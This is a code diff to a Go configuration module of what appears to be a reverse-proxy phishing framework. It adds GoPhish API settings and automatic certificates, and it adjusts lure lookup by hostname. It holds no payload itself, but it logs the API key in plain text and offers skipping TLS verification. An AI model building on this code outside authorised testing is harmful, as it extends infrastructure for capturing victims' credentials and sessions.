@@ -59,6 +59,12 @@ type BlacklistConfig struct {
 type CertificatesConfig struct {
 }
 
+type GoPhishConfig struct {
+	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
+	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
+	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
+}
+
 type GeneralConfig struct {
 	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
 	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
@@ -67,12 +73,14 @@ type GeneralConfig struct {
 	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
 	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
 	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
 }
 
 type Config struct {
 	general         *GeneralConfig
 	certificates    *CertificatesConfig
 	blacklistConfig *BlacklistConfig
+	gophishConfig   *GoPhishConfig
 	proxyConfig     *ProxyConfig
 	phishletConfig  map[string]*PhishletConfig
 	phishlets       map[string]*Phishlet
@@ -93,6 +101,7 @@ const (
 	CFG_PHISHLETS    = "phishlets"
 	CFG_BLACKLIST    = "blacklist"
 	CFG_SUBPHISHLETS = "subphishlets"
+	CFG_GOPHISH      = "gophish"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -101,6 +110,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
 		general:         &GeneralConfig{},
 		certificates:    &CertificatesConfig{},
+		gophishConfig:   &GoPhishConfig{},
 		phishletConfig:  make(map[string]*PhishletConfig),
 		phishlets:       make(map[string]*Phishlet),
 		phishletNames:   []string{},
@@ -134,7 +144,14 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	}
 
 	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
+	if c.cfg.Get("general.autocert") == nil {
+		c.cfg.Set("general.autocert", true)
+		c.general.Autocert = true
+	}
+
 	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
+
+	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
 
 	if c.general.OldIpv4 != "" {
 		if c.general.ExternalIpv4 == "" {
@@ -156,6 +173,9 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	if c.general.DnsPort == 0 {
 		c.SetDnsPort(53)
 	}
+	if created_cfg {
+		c.EnableAutocert(true)
+	}
 
 	c.lures = []*Lure{}
 	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
@@ -168,6 +188,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		c.lureIds = append(c.lureIds, GenRandomToken())
 	}
 
+	c.cfg.WriteConfig()
 	return c, nil
 }
 
@@ -332,6 +353,33 @@ func (c *Config) SetProxyPassword(password string) {
 	c.cfg.WriteConfig()
 }
 
+func (c *Config) SetGoPhishAdminUrl(k string) {
+	u, err := url.ParseRequestURI(k)
+	if err != nil {
+		log.Error("invalid url: %s", err)
+		return
+	}
+
+	c.gophishConfig.AdminUrl = u.String()
+	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
+	log.Info("gophish admin url set to: %s", u.String())
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetGoPhishApiKey(k string) {
+	c.gophishConfig.ApiKey = k
+	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
+	log.Info("gophish api key set to: %s", k)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetGoPhishInsecureTLS(k bool) {
+	c.gophishConfig.InsecureTLS = k
+	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
+	log.Info("gophish insecure set to: %v", k)
+	c.cfg.WriteConfig()
+}
+
 func (c *Config) IsLureHostnameValid(hostname string) bool {
 	for _, l := range c.lures {
 		if l.Hostname == hostname {
@@ -431,14 +479,20 @@ func (c *Config) SetBlacklistMode(mode string) {
 }
 
 func (c *Config) SetUnauthUrl(_url string) {
-	_, err := url.ParseRequestURI(_url)
-	if err != nil {
-		log.Error("invalid URL: %s", err)
-		return
-	}
 	c.general.UnauthUrl = _url
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("unauthorized request redirection URL set to: %s", _url)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) EnableAutocert(enabled bool) {
+	c.general.Autocert = enabled
+	if enabled {
+		log.Info("autocert is now enabled")
+	} else {
+		log.Info("autocert is now disabled")
+	}
+	c.cfg.Set(CFG_GENERAL, c.general)
 	c.cfg.WriteConfig()
 }
 
@@ -581,17 +635,15 @@ func (c *Config) VerifyPhishlets() {
 			continue
 		}
 		for _, ph := range pl.proxyHosts {
-			if ph.is_landing || ph.handle_session {
-				phish_host := combineHost(ph.phish_subdomain, ph.domain)
-				orig_host := combineHost(ph.orig_subdomain, ph.domain)
-				if c_site, ok := hosts[phish_host]; ok {
-					log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
-				} else if c_site, ok := hosts[orig_host]; ok {
-					log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
-				}
-				hosts[phish_host] = site
-				hosts[orig_host] = site
+			phish_host := combineHost(ph.phish_subdomain, ph.domain)
+			orig_host := combineHost(ph.orig_subdomain, ph.domain)
+			if c_site, ok := hosts[phish_host]; ok {
+				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
+			} else if c_site, ok := hosts[orig_host]; ok {
+				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
 			}
+			hosts[phish_host] = site
+			hosts[orig_host] = site
 		}
 	}
 }
@@ -686,11 +738,16 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	}
 }
 
-func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
+func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
 	for _, l := range c.lures {
 		if l.Phishlet == site {
-			if l.Path == path {
-				return l, nil
+			pl, err := c.GetPhishlet(site)
+			if err == nil {
+				if host == l.Hostname || host == pl.GetLandingPhishHost() {
+					if l.Path == path {
+						return l, nil
+					}
+				}
 			}
 		}
 	}
@@ -749,4 +806,20 @@ func (c *Config) GetRedirectorsDir() string {
 
 func (c *Config) GetBlacklistMode() string {
 	return c.blacklistConfig.Mode
+}
+
+func (c *Config) IsAutocertEnabled() bool {
+	return c.general.Autocert
+}
+
+func (c *Config) GetGoPhishAdminUrl() string {
+	return c.gophishConfig.AdminUrl
+}
+
+func (c *Config) GetGoPhishApiKey() string {
+	return c.gophishConfig.ApiKey
+}
+
+func (c *Config) GetGoPhishInsecureTLS() bool {
+	return c.gophishConfig.InsecureTLS
 }
